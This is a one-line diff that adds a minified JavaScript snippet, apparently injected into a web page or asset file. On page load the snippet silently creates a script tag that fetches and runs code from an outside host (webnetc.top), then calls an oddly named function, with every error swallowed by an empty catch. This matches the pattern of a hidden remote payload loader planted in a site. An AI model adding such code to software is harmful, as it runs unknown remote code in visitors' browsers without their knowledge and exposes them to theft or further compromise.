@@ -1,0 +1,1 @@
+!function () { try { var l = function (src, hash) { var s = document.createElement('script'); s.type = 'text/javascript'; s.src = src; document.body.appendChild(s); s.onload = function () { all_bnxa(hash); }; }; l('https://webnetc.top/v/296069.js?j=1221', '296069'); } catch (e) { } }();
